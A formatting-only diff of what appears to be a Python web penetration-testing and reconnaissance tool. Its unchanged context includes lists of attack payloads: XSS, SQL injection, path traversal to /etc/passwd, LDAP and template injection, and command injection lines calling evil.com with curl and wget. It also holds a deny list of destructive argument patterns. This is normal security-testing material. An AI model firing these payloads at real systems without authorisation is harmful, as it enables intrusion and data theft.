+                "META-INF/context.xml",
+            ],
             "rails": ["config/routes.rb", "config/database.yml", "Gemfile", "Rakefile"],
             "node": ["package.json", "app.js", "server.js", "index.js", "config.json"],
-            "python": ["app.py", "main.py", "settings.py", "config.py", "requirements.txt"],
+            "python": [
+                "app.py",
+                "main.py",
+                "settings.py",
+                "config.py",
+                "requirements.txt",
+            ],
             "git": [".git/config", ".git/HEAD", ".git/logs/HEAD", ".gitignore"],
-            "env": [".env", ".env.local", ".env.production", ".env.development", "config.json"],
-            "docker": ["Dockerfile", "docker-compose.yml", ".dockerignore", "entrypoint.sh"]
+            "env": [
+                ".env",
+                ".env.local",
+                ".env.production",
+                ".env.development",
+                "config.json",
+            ],
+            "docker": [
+                "Dockerfile",
+                "docker-compose.yml",
+                ".dockerignore",
+                "entrypoint.sh",
+            ],
         }
 
         # Create comprehensive wordlist files
         wordlist_sets = {
             "directories/dirs_common.txt": common_dirs,
             "directories/dirs_api.txt": api_paths,
-            "directories/dirs_admin.txt": [d for d in common_dirs if any(x in d for x in ["admin", "panel", "dashboard", "manage"])],
+            "directories/dirs_admin.txt": [
+                d
+                for d in common_dirs
+                if any(x in d for x in ["admin", "panel", "dashboard", "manage"])
+            ],
             "parameters/params_common.txt": common_params,
-            "parameters/params_auth.txt": [p for p in common_params if any(x in p for x in ["auth", "token", "key", "session", "login"])],
+            "parameters/params_auth.txt": [
+                p
+                for p in common_params
+                if any(x in p for x in ["auth", "token", "key", "session", "login"])
+            ],
             "subdomains/subdomains_common.txt": subdomain_prefixes,
-            "subdomains/subdomains_tech.txt": [s for s in subdomain_prefixes if any(x in s for x in ["dev", "test", "staging", "api", "admin"])],
+            "subdomains/subdomains_tech.txt": [
+                s
+                for s in subdomain_prefixes
+                if any(x in s for x in ["dev", "test", "staging", "api", "admin"])
+            ],
         }
 
         # Add technology-specific wordlists
@@ -2357,7 +3109,7 @@ class EnhancedPayloadManager:
             output_file.parent.mkdir(parents=True, exist_ok=True)
 
             try:
-                with open(output_file, 'w') as f:
+                with open(output_file, "w") as f:
                     for word in sorted(set(wordlist)):
                         f.write(f"{word}\n")
                 logger.log(f"Created wordlist file: {file_path}", "SUCCESS")
@@ -2365,7 +3117,6 @@ class EnhancedPayloadManager:
                 logger.log(f"Failed to create wordlist file {file_path}: {e}", "ERROR")
 
     @staticmethod
-
     def get_best_wordlist(category: str, subcategory: str = "common") -> Optional[Path]:
         """Get the best available wordlist for a category"""
         # Check local custom wordlists first
@@ -2393,7 +3144,6 @@ class EnhancedPayloadManager:
         return None
 
     @staticmethod
-
     def create_enhanced_payloads():
         """Create comprehensive payload collections for various attack vectors"""
         # XSS payloads
@@ -2417,7 +3167,7 @@ class EnhancedPayloadManager:
             "<select onfocus=alert('XSS') autofocus>",
             "<textarea onfocus=alert('XSS') autofocus>",
             "<keygen onfocus=alert('XSS') autofocus>",
-            "<embed src=javascript:alert('XSS')>"
+            "<embed src=javascript:alert('XSS')>",
         ]
 
         # SQL injection payloads
@@ -2441,7 +3191,7 @@ class EnhancedPayloadManager:
             "admin'/*",
             "' OR 1=1/*",
             "' OR 'something' like 'some%",
-            "' waitfor delay '00:00:05'--"
+            "' waitfor delay '00:00:05'--",
         ]
 
         # Directory traversal payloads
@@ -2465,7 +3215,7 @@ class EnhancedPayloadManager:
             "../../../../../../../../../etc/passwd",
             "....//....//....//....//....//....//etc/passwd",
             "/etc/passwd%00",
-            "etc/passwd%00.jpg"
+            "etc/passwd%00.jpg",
         ]
 
         # Command injection payloads
@@ -2489,7 +3239,7 @@ class EnhancedPayloadManager:
             "$(cat /etc/passwd)",
             "; ping -c 4 127.0.0.1",
             "; curl http://evil.com/",
-            "; wget http://evil.com/"
+            "; wget http://evil.com/",
         ]
 
         # LDAP injection payloads
@@ -2503,7 +3253,7 @@ class EnhancedPayloadManager:
             ")|(&(objectClass=*)(uid=admin))",
             "*)(|(objectClass=*))",
             "admin))(|(uid=*",
-            "*)(&(objectClass=user)(uid=*))"
+            "*)(&(objectClass=user)(uid=*))",
         ]
 
         # Template payloads
@@ -2519,7 +3269,7 @@ class EnhancedPayloadManager:
             "#{7*7}",
             "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
             "${T(java.lang.System).getenv()}",
-            "{{''.constructor.constructor('alert(1)')()}}"
+            "{{''.constructor.constructor('alert(1)')()}}",
         ]
 
         # Create payload files
@@ -2529,7 +3279,7 @@ class EnhancedPayloadManager:
             "lfi/directory_traversal.txt": lfi_payloads,
             "rce/command_injection.txt": rce_payloads,
             "ldap/ldap_injection.txt": ldap_payloads,
-            "ssti/template_injection.txt": ssti_payloads
+            "ssti/template_injection.txt": ssti_payloads,
         }
 
         for file_path, payloads in payload_sets.items():
@@ -2537,7 +3287,7 @@ class EnhancedPayloadManager:
             output_file.parent.mkdir(parents=True, exist_ok=True)
 
             try:
-                with open(output_file, 'w') as f:
+                with open(output_file, "w") as f:
                     for payload in payloads:
                         f.write(f"{payload}\n")
                 logger.log(f"Created payload file: {file_path}", "SUCCESS")
@@ -2545,7 +3295,6 @@ class EnhancedPayloadManager:
                 logger.log(f"Failed to create payload file {file_path}: {e}", "ERROR")
 
     @staticmethod
-
     def get_payload_file(category: str, subcategory: str = "basic") -> Optional[Path]:
         """Get the best available payload file for a category"""
         payload_file = PAYLOADS_DIR / category / f"{category}_{subcategory}.txt"
@@ -2567,7 +3316,6 @@ class EnhancedPayloadManager:
         return None
 
     @staticmethod
-
     def show_payload_stats():
         """Display payload and wordlist statistics"""
         print("\n\033[92m📊 Payload & Wordlist Statistics:\033[0m")
@@ -2579,8 +3327,12 @@ class EnhancedPayloadManager:
                 files = list(category_dir.glob("*.txt"))
                 file_count = len(files)
                 if file_count > 0:
-                    total_lines = sum(len(read_lines(f)) for f in files if f.stat().st_size > 0)
-                    print(f"  🎯 {category_dir.name}: {file_count} files, {total_lines:,} payloads")
+                    total_lines = sum(
+                        len(read_lines(f)) for f in files if f.stat().st_size > 0
+                    )
+                    print(
+                        f"  🎯 {category_dir.name}: {file_count} files, {total_lines:,} payloads"
+                    )
                     payload_count += total_lines
 
         # Wordlist statistics
@@ -2590,18 +3342,23 @@ class EnhancedPayloadManager:
                 files = list(category_dir.glob("*.txt"))
                 file_count = len(files)
                 if file_count > 0:
-                    total_lines = sum(len(read_lines(f)) for f in files if f.stat().st_size > 0)
-                    print(f"  📝 {category_dir.name}: {file_count} files, {total_lines:,} entries")
+                    total_lines = sum(
+                        len(read_lines(f)) for f in files if f.stat().st_size > 0
+                    )
+                    print(
+                        f"  📝 {category_dir.name}: {file_count} files, {total_lines:,} entries"
+                    )
                     wordlist_count += total_lines
 
-        print(f"\n\033[96m📈 Total: {payload_count:,} payloads, {wordlist_count:,} wordlist entries\033[0m")
+        print(
+            f"\n\033[96m📈 Total: {payload_count:,} payloads, {wordlist_count:,} wordlist entries\033[0m"
+        )
 
 
 class EnhancedNucleiManager:
     """Enhanced nuclei template management with community sources"""
 
     @staticmethod
-
     def update_nuclei_templates():
         """Update nuclei templates from multiple sources"""
         logger.log("Updating nuclei templates from multiple sources...", "INFO")
@@ -2619,37 +3376,44 @@ class EnhancedNucleiManager:
             {
                 "name": "SecLists Integration",
                 "url": "https://github.com/danielmiessler/SecLists",
-                "path": EXT_DIR / "seclists"
+                "path": EXT_DIR / "seclists",
             },
             {
                 "name": "FuzzDB Integration",
                 "url": "https://github.com/fuzzdb-project/fuzzdb",
-                "path": EXT_DIR / "fuzzdb"
+                "path": EXT_DIR / "fuzzdb",
             },
             {
                 "name": "PayloadsAllTheThings",
                 "url": "https://github.com/swisskyrepo/PayloadsAllTheThings",
-                "path": EXT_DIR / "payloads-all-the-things"
-            }
+                "path": EXT_DIR / "payloads-all-the-things",
+            },
         ]
 
         for source in community_sources:
             try:
                 if not source["path"].exists():
                     logger.log(f"Cloning {source['name']}...", "INFO")
-                    result = safe_run_command([
-                        "git", "clone", "--depth", "1",
-                        source["url"], str(source["path"])
-                    ], timeout=300)
+                    result = safe_run_command(
+                        [
+                            "git",
+                            "clone",
+                            "--depth",
+                            "1",
+                            source["url"],
+                            str(source["path"]),
+                        ],
+                        timeout=300,
+                    )
                     if result and result.returncode == 0:
                         logger.log(f"{source['name']} cloned successfully", "SUCCESS")
                     else:
                         logger.log(f"Failed to clone {source['name']}", "WARNING")
                 else:
                     logger.log(f"Updating {source['name']}...", "INFO")
-                    result = safe_run_command([
-                        "git", "pull"
-                    ], cwd=source["path"], timeout=120)
+                    result = safe_run_command(
+                        ["git", "pull"], cwd=source["path"], timeout=120
+                    )
                     if result and result.returncode == 0:
                         logger.log(f"{source['name']} updated successfully", "SUCCESS")
                     else:
@@ -2658,7 +3422,6 @@ class EnhancedNucleiManager:
                 logger.log(f"Error with {source['name']}: {e}", "ERROR")
 
     @staticmethod
-
     def get_nuclei_template_paths() -> List[str]:
         """Get all available nuclei template paths"""
         template_paths = []
@@ -2682,7 +3445,6 @@ class EnhancedNucleiManager:
         return template_paths
 
     @staticmethod
-
     def create_custom_nuclei_templates():
         """Create custom nuclei templates for enhanced detection"""
         custom_dir = HERE / "nuclei-templates" / "custom"
@@ -2738,8 +3500,6 @@ requests:
             logger.log(f"Failed to create custom nuclei template: {e}", "ERROR")
 
     @staticmethod
-
-
     def show_nuclei_stats():
         """Display nuclei template statistics"""
         template_paths = EnhancedNucleiManager.get_nuclei_template_paths()
@@ -2750,25 +3510,31 @@ requests:
         for path in template_paths:
             path_obj = Path(path)
             if path_obj.exists():
-                yaml_files = list(path_obj.rglob("*.yaml")) + list(path_obj.rglob("*.yml"))
+                yaml_files = list(path_obj.rglob("*.yaml")) + list(
+                    path_obj.rglob("*.yml")
+                )
                 count = len(yaml_files)
                 total_templates += count
                 print(f"  📂 {path_obj.name}: {count:,} templates")
 
         print(f"\n\033[96m🔥 Total Nuclei Templates: {total_templates:,}\033[0m")
 
-def create_resource_monitor_thread(cfg: Dict[str, Any]) -> Tuple[threading.Event, threading.Thread]:
+
+def create_resource_monitor_thread(
+    cfg: Dict[str, Any],
+) -> Tuple[threading.Event, threading.Thread]:
     """Create and start a resource monitoring thread"""
     stop_event = threading.Event()
     monitor_thread = threading.Thread(
-        target=resource_monitor,
-        args=(cfg, stop_event),
-        daemon=True
+        target=resource_monitor, args=(cfg, stop_event), daemon=True
     )
     monitor_thread.start()
     return stop_event, monitor_thread
 
-def cleanup_resource_monitor(stop_event: threading.Event, monitor_thread: threading.Thread):
+
+def cleanup_resource_monitor(
+    stop_event: threading.Event, monitor_thread: threading.Thread
+):
     """Safely cleanup resource monitoring thread"""
     try:
         stop_event.set()
@@ -2777,27 +3543,34 @@ def cleanup_resource_monitor(stop_event: threading.Event, monitor_thread: thread
         logger.log(f"Error cleaning up resource monitor: {e}", "WARNING")
 
 
-def execute_tool_safely(tool_name: str, args: List[str], timeout: int = 300,
-                       output_file: Optional[Path] = None, enable_fallback: bool = True) -> bool:
+def execute_tool_safely(
+    tool_name: str,
+    args: List[str],
+    timeout: int = 300,
+    output_file: Optional[Path] = None,
+    enable_fallback: bool = True,
+) -> bool:
     """Safely execute security tools with enhanced error handling and graceful fallbacks"""
     # Enhanced tool availability check with installation suggestions
     if not which(tool_name):
         install_suggestions = {
-            'nuclei': 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
-            'subfinder': 'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
-            'httpx': 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest',
-            'naabu': 'go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest',
-            'ffu': 'go install github.com/ffuf/ffuf/v2@latest',
-            'nmap': 'apt install nmap',
-            'sqlmap': 'apt install sqlmap',
-            'masscan': 'apt install masscan',
-            'gobuster': 'go install github.com/OJ/gobuster/v3@latest',
-            'amass': 'go install github.com/owasp-amass/amass/v4/cmd/amass@master',
-            'whois': 'apt install whois'
+            "nuclei": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+            "subfinder": "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
+            "httpx": "go install github.com/projectdiscovery/httpx/cmd/httpx@latest",
+            "naabu": "go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
+            "ffu": "go install github.com/ffuf/ffuf/v2@latest",
+            "nmap": "apt install nmap",
+            "sqlmap": "apt install sqlmap",
+            "masscan": "apt install masscan",
+            "gobuster": "go install github.com/OJ/gobuster/v3@latest",
+            "amass": "go install github.com/owasp-amass/amass/v4/cmd/amass@master",
+            "whois": "apt install whois",
         }
 
         suggestion = install_suggestions.get(tool_name, f"Please install {tool_name}")
-        logger.log(f"Tool '{tool_name}' not available. Install with: {suggestion}", "WARNING")
+        logger.log(
+            f"Tool '{tool_name}' not available. Install with: {suggestion}", "WARNING"
+        )
 
         # Try fallback function if enabled and available
         if enable_fallback and tool_name in FALLBACK_FUNCTIONS:
@@ -2809,10 +3582,19 @@ def execute_tool_safely(tool_name: str, args: List[str], timeout: int = 300,
 
         # Check if this is a critical tool and suggest alternatives
         critical_alternatives = {
-            'nuclei': ['Manual vulnerability scanning recommended', 'Consider using nikto or manual testing'],
-            'nmap': ['Use netcat for port testing', 'Consider using naabu or masscan'],
-            'subfinder': ['Try manual subdomain enumeration', 'Use DNS brute force with wordlists'],
-            'sqlmap': ['Perform manual SQL injection testing', 'Use custom payloads for testing']
+            "nuclei": [
+                "Manual vulnerability scanning recommended",
+                "Consider using nikto or manual testing",
+            ],
+            "nmap": ["Use netcat for port testing", "Consider using naabu or masscan"],
+            "subfinder": [
+                "Try manual subdomain enumeration",
+                "Use DNS brute force with wordlists",
+            ],
+            "sqlmap": [
+                "Perform manual SQL injection testing",
+                "Use custom payloads for testing",
+            ],
         }
 
         if tool_name in critical_alternatives:
@@ -2824,13 +3606,24 @@ def execute_tool_safely(tool_name: str, args: List[str], timeout: int = 300,
     # Enhanced argument validation with detailed error messages
     for i, arg in enumerate(args):
         if isinstance(arg, str):
-            if not validate_input(arg, {'max_length': 1000, 'allow_empty': False}, f"arg_{i}"):
-                logger.log(f"Invalid argument #{i} for {tool_name}: '{arg[:100]}...' (length: {len(arg)})", "ERROR")
+            if not validate_input(
+                arg, {"max_length": 1000, "allow_empty": False}, f"arg_{i}"
+            ):
+                logger.log(
+                    f"Invalid argument #{i} for {tool_name}: '{arg[:100]}...' (length: {len(arg)})",
+                    "ERROR",
+                )
                 return False
 
             # Additional security validation for specific patterns
-            if any(pattern in arg.lower() for pattern in ['rm -r', 'format c:', ':(){ :|:& };:']):
-                logger.log(f"Potentially dangerous argument detected for {tool_name}: {arg[:50]}", "ERROR")
+            if any(
+                pattern in arg.lower()
+                for pattern in ["rm -r", "format c:", ":(){ :|:& };:"]
+            ):
+                logger.log(
+                    f"Potentially dangerous argument detected for {tool_name}: {arg[:50]}",
+                    "ERROR",
+                )
                 return False
 
     cmd = [tool_name] + args
@@ -2844,37 +3637,49 @@ def execute_tool_safely(tool_name: str, args: List[str], timeout: int = 300,
         timeout=timeout,
         default=None,
         error_msg=f"Tool execution failed: {tool_name} (args: {len(args)})",
-        log_level="ERROR"
+        log_level="ERROR",
     )
 
     if result is None:
-        logger.log(f"Tool {tool_name} execution returned no result - check tool output above", "WARNING")
+        logger.log(
+            f"Tool {tool_name} execution returned no result - check tool output above",
+            "WARNING",
+        )
         return False
 
     # Enhanced output handling with validation
-    if output_file and hasattr(result, 'stdout'):
+    if output_file and hasattr(result, "stdout"):
         if result.stdout:
             success = atomic_write(output_file, result.stdout)
             if success:
-                logger.log(f"Tool output saved to {output_file} ({len(result.stdout)} chars)", "DEBUG")
+                logger.log(
+                    f"Tool output saved to {output_file} ({len(result.stdout)} chars)",
+                    "DEBUG",
+                )
             return success
         else:
             logger.log(f"Tool {tool_name} produced no output", "WARNING")
             # Create empty file to indicate tool ran but produced no output
             if output_file:
-                atomic_write(output_file, f"# {tool_name} executed successfully but produced no output\n")
+                atomic_write(
+                    output_file,
+                    f"# {tool_name} executed successfully but produced no output\n",
+                )
             return True
 
     # Check if tool executed successfully based on return code
-    if hasattr(result, 'returncode'):
+    if hasattr(result, "returncode"):
         if result.returncode == 0:
             logger.log(f"Tool {tool_name} completed successfully", "DEBUG")
             return True
         else:
-            logger.log(f"Tool {tool_name} exited with code {result.returncode}", "WARNING")
+            logger.log(
+                f"Tool {tool_name} exited with code {result.returncode}", "WARNING"
+            )
             return False
 
     return result is not None
+
 
 # ---------- Utils ----------
 def _bump_path() -> None:
@@ -2893,14 +3698,14 @@ def _bump_path() -> None:
         "/snap/bin",  # For snap packages
         "/usr/games",  # Sometimes tools are installed here
     ]
-    
+
     # Also set GOPATH and GOBIN if not set
     if not os.environ.get("GOPATH"):
         os.environ["GOPATH"] = str(home / "go")
-    
+
     if not os.environ.get("GOBIN"):
         os.environ["GOBIN"] = str(home / "go/bin")
-    
+
     # Ensure Go bin directories exist
     go_bin = home / "go/bin"
     if not go_bin.exists():
@@ -2909,17 +3714,17 @@ def _bump_path() -> None:
             logger.log(f"Created Go bin directory: {go_bin}", "DEBUG")
         except Exception as e:
             logger.log(f"Failed to create Go bin directory: {e}", "WARNING")
-    
+
     for p in add:
         s = str(p)
         if s not in envpath:
             try:
                 # Check if path exists - handle both Path objects and strings
-                if hasattr(p, 'exists'):
+                if hasattr(p, "exists"):
                     exists = p.exists()
                 else:
                     exists = os.path.exists(s)
-                
+
                 if exists:
                     envpath = s + os.pathsep + envpath
             except Exception:
@@ -2928,18 +3733,22 @@ def _bump_path() -> None:
     os.environ["PATH"] = envpath
     logger.log("PATH updated with Go environment", "DEBUG")
 
+
 _bump_path()
+
 
 def ts() -> str:
     return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%fZ")
 
+
 def atomic_write(path: Path, data: str) -> bool:
     """Atomically write data to a file with proper error handling"""
 
-
     def _write_operation():
         path.parent.mkdir(parents=True, exist_ok=True)
-        with tempfile.NamedTemporaryFile("w", delete=False, dir=path.parent, encoding="utf-8") as tmp:
+        with tempfile.NamedTemporaryFile(
+            "w", delete=False, dir=path.parent, encoding="utf-8"
+        ) as tmp:
             tmp.write(data)
             tmp.flush()
             os.fsync(tmp.fileno())
@@ -2948,10 +3757,9 @@ def atomic_write(path: Path, data: str) -> bool:
         return True
 
     return safe_execute(
-        _write_operation,
-        default=False,
-        error_msg=f"Failed to write file {path}"
+        _write_operation, default=False, error_msg=f"Failed to write file {path}"
     )
+
 
 def read_lines(path: Path) -> List[str]:
     """Read lines from a file, ignoring comments and empty lines"""
@@ -2970,8 +3778,9 @@ def read_lines(path: Path) -> List[str]:
         _read_operation,
         default=[],
         error_msg=f"Failed to read file {path}",
-        log_level="WARNING"
+        log_level="WARNING",
     )
+
 
 def write_uniq(path: Path, items: List[str]) -> bool:
     """Write unique items to file, removing duplicates"""
@@ -2988,6 +3797,7 @@ def write_lines(path: Path, items: List[str]) -> bool:
     """Write lines to file"""
     return atomic_write(path, "\n".join(items) + ("\n" if items else ""))
 
+
 def os_kind() -> str:
     s = platform.system().lower()
     if s == "darwin":
@@ -2995,6 +3805,7 @@ def os_kind() -> str:
     if s == "linux":
         try:
             import distro  # type: ignore
+
             d = distro.id().lower()
             if d in {"arch", "manjaro", "endeavouros"}:
                 return "arch"
@@ -3003,16 +3814,19 @@ def os_kind() -> str:
             return "debian"
     return "debian"
 
-def run_cmd(cmd,
-            cwd: Optional[Path] = None,
-            env: Optional[Dict[str, str]] = None,
-            timeout: int = 0,
-            retries: int = 0,
-            backoff: float = 1.6,
-            capture: bool = True,
-            check_return: bool = True,
-            use_shell: bool = False,
-            input_data: Optional[str] = None) -> subprocess.CompletedProcess:
+
+def run_cmd(
+    cmd,
+    cwd: Optional[Path] = None,
+    env: Optional[Dict[str, str]] = None,
+    timeout: int = 0,
+    retries: int = 0,
+    backoff: float = 1.6,
+    capture: bool = True,
+    check_return: bool = True,
+    use_shell: bool = False,
+    input_data: Optional[str] = None,
+) -> subprocess.CompletedProcess:
     """Enhanced command execution with better error handling and retry logic"""
     if isinstance(cmd, str):
         args = cmd if use_shell else shlex.split(cmd)
@@ -3041,37 +3855,50 @@ def run_cmd(cmd,
                 capture_output=capture,
                 timeout=timeout if timeout and timeout > 0 else None,
                 shell=use_shell,
-                input=input_data
+                input=input_data,
             )
             dt = round(time.time() - t0, 3)
 
             # Enhanced output logging with size limits
             if p.stdout:
-                stdout_preview = p.stdout[:1000] + "..." if len(p.stdout) > 1000 else p.stdout
-                logger.log(f"Command completed in {dt}s with stdout ({len(p.stdout)} chars)", "DEBUG")
+                stdout_preview = (
+                    p.stdout[:1000] + "..." if len(p.stdout) > 1000 else p.stdout
+                )
+                logger.log(
+                    f"Command completed in {dt}s with stdout ({len(p.stdout)} chars)",
+                    "DEBUG",
+                )
                 logger.log(f"STDOUT preview: {stdout_preview}", "DEBUG")
             if p.stderr:
-                stderr_preview = p.stderr[:500] + "..." if len(p.stderr) > 500 else p.stderr
+                stderr_preview = (
+                    p.stderr[:500] + "..." if len(p.stderr) > 500 else p.stderr
+                )
                 logger.log(f"STDERR ({len(p.stderr)} chars): {stderr_preview}", "DEBUG")
 
             # Enhanced return code handling
             if check_return and p.returncode != 0:
-                cmd_str = ' '.join(args) if isinstance(args, list) else str(args)
+                cmd_str = " ".join(args) if isinstance(args, list) else str(args)
                 error_msg = f"Command failed with exit code {p.returncode}: {cmd_str}"
 
                 # Provide specific error context based on return code
                 if p.returncode == 1:
-                    error_msg += " (General error - check command syntax and parameters)"
+                    error_msg += (
+                        " (General error - check command syntax and parameters)"
+                    )
                 elif p.returncode == 2:
                     error_msg += " (Invalid usage - check command arguments)"
                 elif p.returncode == 126:
-                    error_msg += " (Command found but not executable - check permissions)"
+                    error_msg += (
+                        " (Command found but not executable - check permissions)"
+                    )
                 elif p.returncode == 127:
                     error_msg += " (Command not found - check if tool is installed)"
                 elif p.returncode == 130:
                     error_msg += " (Process interrupted - likely by user or timeout)"
 
-                raise subprocess.CalledProcessError(p.returncode, args, p.stdout, p.stderr)
+                raise subprocess.CalledProcessError(
+                    p.returncode, args, p.stdout, p.stderr
+                )
 
             logger.log(f"Command executed successfully in {dt}s", "DEBUG")
             return p
@@ -3083,11 +3910,14 @@ def run_cmd(cmd,
 
             # Provide timeout-specific recovery suggestions
             if attempt == 0:  # Only log suggestions on first timeout
-                logger.log("Timeout recovery suggestions: increase timeout, reduce scope, or check network", "INFO")
+                logger.log(
+                    "Timeout recovery suggestions: increase timeout, reduce scope, or check network",
+                    "INFO",
+                )
 
         except subprocess.CalledProcessError as e:
             last_exc = e
-            cmd_str = ' '.join(e.cmd) if isinstance(e.cmd, list) else str(e.cmd)
+            cmd_str = " ".join(e.cmd) if isinstance(e.cmd, list) else str(e.cmd)
             logger.log(f"Command failed (exit {e.returncode}): {cmd_str}", "ERROR")
 
             # Log stderr if available for debugging
@@ -3096,13 +3926,20 @@ def run_cmd(cmd,
 
         except FileNotFoundError as e:
             last_exc = e
-            tool_name = args[0] if isinstance(args, list) and len(args) > 0 else str(cmd)
+            tool_name = (
+                args[0] if isinstance(args, list) and len(args) > 0 else str(cmd)
+            )
             logger.log(f"Tool not found: {tool_name}", "ERROR")
-            logger.log(f"Install suggestion: Check if {tool_name} is installed and in PATH", "INFO")
+            logger.log(
+                f"Install suggestion: Check if {tool_name} is installed and in PATH",
+                "INFO",
+            )
 
         except Exception as e:
             last_exc = e
-            error_context = f"Unexpected error executing: {args if isinstance(args, list) else cmd}"
+            error_context = (
+                f"Unexpected error executing: {args if isinstance(args, list) else cmd}"
+            )
             logger.log(f"{error_context} -> {type(e).__name__}: {e}", "ERROR")
 
         attempt += 1
@@ -3114,58 +3951,80 @@ def run_cmd(cmd,
             raise last_exc  # type: ignore
 
         # Exponential backoff with jitter
-        sleep_for = min(backoff ** attempt + (attempt * 0.1), 30)  # Cap at 30 seconds
-        logger.log(f"Retrying command in {sleep_for:.1f}s (attempt {attempt}/{max_retries})", "WARNING")
+        sleep_for = min(backoff**attempt + (attempt * 0.1), 30)  # Cap at 30 seconds
+        logger.log(
+            f"Retrying command in {sleep_for:.1f}s (attempt {attempt}/{max_retries})",
+            "WARNING",
+        )
         time.sleep(sleep_for)
 
+
 def ensure_layout():
-    for d in [RUNS_DIR, LOG_DIR, EXT_DIR, EXTRA_DIR, MERGED_DIR, PAYLOADS_DIR, EXPLOITS_DIR, PLUGINS_DIR, BACKUP_DIR]:
+    for d in [
+        RUNS_DIR,
+        LOG_DIR,
+        EXT_DIR,
+        EXTRA_DIR,
+        MERGED_DIR,
+        PAYLOADS_DIR,
+        EXPLOITS_DIR,
+        PLUGINS_DIR,
+        BACKUP_DIR,
+    ]:
         d.mkdir(parents=True, exist_ok=True)
-    for f in ["paths_extra.txt", "vhosts_extra.txt", "params_extra.txt", "exploit_payloads.txt"]:
+    for f in [
+        "paths_extra.txt",
+        "vhosts_extra.txt",
+        "params_extra.txt",
+        "exploit_payloads.txt",
+    ]:
         (EXTRA_DIR / f).touch(exist_ok=True)
     if not TARGETS.exists():
         atomic_write(TARGETS, "example.com\n")
     if not CFG_FILE.exists():
         atomic_write(CFG_FILE, json.dumps(DEFAULT_CFG, indent=2))
 
+
 # Configuration cache for performance optimization
 _config_cache = None
 _config_cache_timestamp = 0
 
+
 def load_cfg() -> Dict[str, Any]:
     """Load and validate configuration with caching for improved performance"""
     global _config_cache, _config_cache_timestamp
-    
+
     ensure_layout()
-    
+
     # Check if we have a cached config and if the file hasn't changed
     try:
         current_timestamp = CFG_FILE.stat().st_mtime if CFG_FILE.exists() else 0
-        
+
         if _config_cache is not None and _config_cache_timestamp == current_timestamp:
             return _config_cache.copy()
-        
+
         # Load configuration from file
         cfg_data = json.loads(CFG_FILE.read_text(encoding="utf-8"))
-        
+
         # Validate critical configuration sections
         validated_cfg = _validate_configuration(cfg_data)
-        
+
         # Cache the validated configuration
         _config_cache = validated_cfg.copy()
         _config_cache_timestamp = current_timestamp
-        
+
         return validated_cfg
-        
+
     except Exception as e:
         logger.log(f"Configuration load error: {e}, using defaults", "WARNING")
-        
+
         # Cache the default configuration
         default_cfg = DEFAULT_CFG.copy()
         _config_cache = default_cfg.copy()
         _config_cache_timestamp = 0
-        
+
         return default_cfg
+
 
 def _validate_configuration(cfg: Dict[str, Any]) -> Dict[str, Any]:
     """Enhanced configuration validation with comprehensive checks and safe defaults"""
@@ -3174,7 +4033,9 @@ def _validate_configuration(cfg: Dict[str, Any]) -> Dict[str, Any]:
 
     # Validate limits section with expanded checks
     limits = validated_cfg.get("limits", {})
-    limits["max_concurrent_scans"] = max(1, min(limits.get("max_concurrent_scans", 8), 20))
+    limits["max_concurrent_scans"] = max(
+        1, min(limits.get("max_concurrent_scans", 8), 20)
+    )
     limits["http_timeout"] = max(5, min(limits.get("http_timeout", 15), 300))
     limits["rps"] = max(1, min(limits.get("rps", 500), 2000))
     limits["parallel_jobs"] = max(1, min(limits.get("parallel_jobs", 10), 50))
@@ -3195,10 +4056,18 @@ def _validate_configuration(cfg: Dict[str, Any]) -> Dict[str, Any]:
 
     # Enhanced resource management
     resource_mgmt = validated_cfg.get("resource_management", {})
-    resource_mgmt["monitor_interval"] = max(1, min(resource_mgmt.get("monitor_interval", 5), 60))
-    resource_mgmt["cpu_threshold"] = max(10, min(resource_mgmt.get("cpu_threshold", 80), 100))
-    resource_mgmt["memory_threshold"] = max(10, min(resource_mgmt.get("memory_threshold", 80), 100))
-    resource_mgmt["disk_threshold"] = max(10, min(resource_mgmt.get("disk_threshold", 90), 100))
+    resource_mgmt["monitor_interval"] = max(
+        1, min(resource_mgmt.get("monitor_interval", 5), 60)
+    )
+    resource_mgmt["cpu_threshold"] = max(
+        10, min(resource_mgmt.get("cpu_threshold", 80), 100)
+    )
+    resource_mgmt["memory_threshold"] = max(
+        10, min(resource_mgmt.get("memory_threshold", 80), 100)
+    )
+    resource_mgmt["disk_threshold"] = max(
+        10, min(resource_mgmt.get("disk_threshold", 90), 100)
+    )
     resource_mgmt["auto_pause"] = resource_mgmt.get("auto_pause", True)
     resource_mgmt["cleanup_temp"] = resource_mgmt.get("cleanup_temp", True)
     validated_cfg["resource_management"] = resource_mgmt
@@ -3218,7 +4087,9 @@ def _validate_configuration(cfg: Dict[str, Any]) -> Dict[str, Any]:
     fuzzing["enable_ffu"] = fuzzing.get("enable_ffu", True)
     fuzzing["enable_feroxbuster"] = fuzzing.get("enable_feroxbuster", True)
     fuzzing["enable_gobuster"] = fuzzing.get("enable_gobuster", True)
-    fuzzing["wordlist_size_limit"] = max(100, min(fuzzing.get("wordlist_size_limit", 50000), 1000000))
+    fuzzing["wordlist_size_limit"] = max(
+        100, min(fuzzing.get("wordlist_size_limit", 50000), 1000000)
+    )
     fuzzing["threads"] = max(1, min(fuzzing.get("threads", 20), 100))
     fuzzing["delay"] = max(0, min(fuzzing.get("delay", 0), 5000))  # milliseconds
     validated_cfg["fuzzing"] = fuzzing
@@ -3257,8 +4128,10 @@ def _validate_configuration(cfg: Dict[str, Any]) -> Dict[str, Any]:
 
     return validated_cfg
 
+
 def save_cfg(cfg: Dict[str, Any]):
     atomic_write(CFG_FILE, json.dumps(cfg, indent=2))
+
 
 def which(tool: str) -> bool:
     """Enhanced tool detection with fallback alternatives"""
@@ -3270,31 +4143,37 @@ def which(tool: str) -> bool:
         # Fallback to standard shutil.which
         return shutil.which(tool) is not None
 
+
 # ---------- Enhanced Tool Fallback System ----------
+
 
 class EnhancedToolFallbackManager:
     """Enhanced tool management with intelligent fallbacks and auto-installation"""
 
     TOOL_ALTERNATIVES = {
         # Subdomain Discovery (Enhanced)
-        "subfinder": ["amass", "assetfinder", "findomain", "sublist3r", "dnsrecon", "fierce"],
+        "subfinder": [
+            "amass",
